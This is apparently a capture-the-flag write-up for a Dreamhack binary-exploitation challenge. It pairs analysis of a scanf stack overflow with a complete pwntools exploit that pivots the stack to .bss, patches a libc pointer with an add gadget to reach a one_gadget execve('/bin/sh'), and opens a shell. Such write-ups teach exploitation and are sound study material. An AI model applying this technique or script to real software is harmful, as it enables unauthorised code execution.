### I. check mitigation
```D
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
RUNPATH:    b'.'
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
### II. IDA
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char input[256]; // [rsp+0h] [rbp-100h] BYREF

  __isoc99_scanf(&unk_402004, input, envp);
  return 0;
}
.rodata:0000000000402004 unk_402004      db  25h ; %             ; DATA XREF: main+19↑o
.rodata:0000000000402005                 db  73h ; s
```
### III. analyze
#### 1. debug
- very short chall w limited useful gadgets
```python
add_ptr_rbp = 0x000000000040111c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
leave_ret = 0x0000000000401168
ret = 0x000000000040101a
mov_eax_0 = 0x0000000000401163
pop_rbp = 0x000000000040111d
main = 0x0000000000401145
```
- to pass these challs, we will investigate some plt like `puts`, `printf`, `scanf`, `read`,... since they have `push`, `mov [rXp + Y], Z` or `pop` gadgets
- the idea is to pivot stack to .bss to control registers (`pop`) or leak (`push` or `mov [rbp-X], Y`)
- eg after pivoting stack (twice for both `rsp` and `rbp`), calling `scanf@plt`, we acquired libc on .bss
```D
───────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────
 RCX  0x763a93219aa0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 RDI  0x402004 ◂— 0x3b031b0100007325 /* '%s' */
 RSI  0x4048f8 ◂— 0
 R8   0
 R9   0x349a42a0 ◂— 0x4242424242424242 ('BBBBBBBB')
 R10  0x402004 ◂— 0x3b031b0100007325 /* '%s' */
 R15  0x763a933d4040 (_rtld_global) —▸ 0x763a933d52e0 ◂— 0
 RBP  0x4049f8 ◂— 0x4242424242424242 ('BBBBBBBB')
 RSP  0x404930 ◂— 0x4242424242424242 ('BBBBBBBB')
*RIP  0x763a93062172 (__isoc99_scanf+98) ◂— mov rax, qword ptr fs:[0x28]
────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────
   0x763a93062128 <__isoc99_scanf+24>     mov    qword ptr [rsp + 0x38], rcx     [0x404968] <= 0x763a93219aa0 (_IO_2_1_stdin_) ◂— 0xfbad2088
   0x763a9306212d <__isoc99_scanf+29>     mov    qword ptr [rsp + 0x40], r8      [0x404970] <= 0

pwndbg> x/10xg 0x404940
0x404940:       0x4242424242424242      0x4242424242424242
0x404950:       0x4242424242424242      0x00000000004048f8
0x404960:       0x0000000000000000      0x0000763a93219aa0
0x404970:       0x0000000000000000      0x00000000349a42a0
0x404980:       0x4242424242424242      0x4242424242424242
```
- and controlled registers w `pop`
```python
 RAX  1
 RBX  0
 RCX  0x763a93219aa0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 RDX  0x349a4311 ◂— 0x4242424242424242 ('BBBBBBBB')
 RDI  0x4044d0 ◂— 0
 RSI  0xa
 R8   0
 R9   0x349a42a0 ◂— 0xffed2352
 R10  0xffffffffffffff80
 R11  0
 R12  0
 R13  0xa
 R14  0x763a93219aa0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 R15  0xa
 RBP  0x404920 —▸ 0x4049a5 ◂— 0x4242424242424242 ('BBBBBBBB')
*RSP  0x4048f8 ◂— 0xffed2352
*RIP  0x763a9306320f ◂— pop rbx
───────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────
   0x763a93063205                               mov    eax, dword ptr [rbp - 0x640]     EAX, [0x4042e0] => 1
   0x763a9306320b                               lea    rsp, [rbp - 0x28]                RSP => 0x4048f8 ◂— 0xffed2352
 ► 0x763a9306320f                               pop    rbx                              RBX => 0xffed2352
   0x763a93063210                               pop    r12                              R12 => 0
   0x763a93063212                               pop    r13                              R13 => 0
   0x763a93063214                               pop    r14                              R14 => 0
   0x763a93063216                               pop    r15                              R15 => 0
   0x763a93063218                               pop    rbp                              RBP => 0x4049a5
   0x763a93063219                               ret                                <__do_global_dtors_aux+28>
    ↓
   0x40111c       <__do_global_dtors_aux+28>    add    dword ptr [rbp - 0x3d], ebx     [0x404968] <= 0x930ebd52 (0x93219a00 + 0xffed2352)
```
- and as there is a `pop rbx`, we can abuse `add dword ptr [rbp - 0x3d], ebx ; nop ; ret` gadget to modify libc addr value in case we cant leak libc (nothing in hand for leakage :/)
- it adds 4 lower bytes, so the best opt is using one gadget
- check and i found this one may work, `r12 = 0` and `rbp-0x48` is always writable bc its on .bss `rw-p`
```D
0xebd52 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp
```
- as above, `rsp = 0x4048f8`, though i set `saved rbp = 0x404a00` first -> to control `rbx`, we have to set  `saved rbp = 0x4049f8` (sub 0x100 for buf size and buf addr start at `0x4048f8`)
- there is a libc addr at `0x404968` (`_IO_2_1_stdin_`), we will set `saved rbp` via `pop rbp` in `scanf@plt` so that `rbp - 0x3d = 0x404968` -> `save rbp = 0x4049a5`
- let's do some calculations: buf starts at `0x4048f8`, 6 fake values + 1 add gadget, which make up `7 * 0x8 = 0x38` bytes, that is `0x38 + 0x4048f8 = 0x404930`
- one gadget is at `0x404968`, we need 0x38 byte padding = 7-ret slide (or just test from 0 until it works lol)
- `_IO_2_1_stdin_` is at offset `0x219a00`, one gadget is at `0xebd52`, so we will add `0xebd52 - 0x219a00 = 0xffed2352` to rbx

-> overall, since we cant leak libc and also theres only `scanf`, we will have to use add gadgets to change a libc addr available to one gadget. the path will be:
**stack pivot to .bss twice to set `rbp`, `rsp` = .bss addr -> call `scanf@plt` to leave libc addr on .bss, as well as control registers -> use add gadget to change libc value -> jump to one gadget**
#### 2. PoC
```python
#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = './prob_patched'
HOST = 'host8.dreamhack.games'
PORT = 19341

exe = ELF(exe_path, checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
b*0x0000000000401145
b*0x000000000040115e
b*0x0000000000401163
c
c
c
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

# ============================EXPLOIT============================

# pop start at 0x4048f8

# ROP GADGETS
add_ptr_rbp = 0x000000000040111c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
leave_ret = 0x0000000000401168
ret = 0x000000000040101a
mov_eax_0 = 0x0000000000401163
pop_rbp = 0x000000000040111d
main = 0x0000000000401145

# stack pivot
pause()

sl(b'A' * 0x100 + p64(0x404a00) + p64(main))
pause()
sl(b'B' * 0x100 + p64(0x4049f8) + p64(main))
pause()

# ROPchain
payload = flat(
    0xffed2352,
    p64(0x0) * 4,
    0x4049a5,
    add_ptr_rbp,
    ret, ret, ret, ret, ret, ret, ret
)
sl(payload)

p.interactive()

```